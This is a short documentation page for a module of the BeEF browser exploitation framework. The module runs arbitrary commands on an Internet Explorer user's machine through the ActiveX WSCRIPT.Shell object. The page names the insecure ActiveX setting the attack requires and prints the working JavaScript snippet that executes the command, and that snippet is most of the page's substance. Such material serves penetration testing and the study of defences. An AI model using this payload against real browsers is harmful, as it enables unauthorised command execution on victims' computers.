## Summary

* **Objective**: execute arbitary commands using WSCRIPT.Shell object
* **Authors**: bcoles
* **Browsers**: IE

* [Code](https://github.com/beefproject/beef/tree/master/modules/local_host/activex_command_execution)

## Internal Working

Execute arbitrary commands using the "WSCRIPT.Shell" object. The command response is not returned to BeEF. 

The browser must have "Initialize and script ActiveX controls not marked as safe for scripting" enabled.


```js
try {
        var shell = new ActiveXObject('WSCRIPT.Shell').Run(cmd);
        if (shell.toString() == 0) {
                result = "command sent";
        } else {
                result = "command failed";
        }
}
```


## Feedback
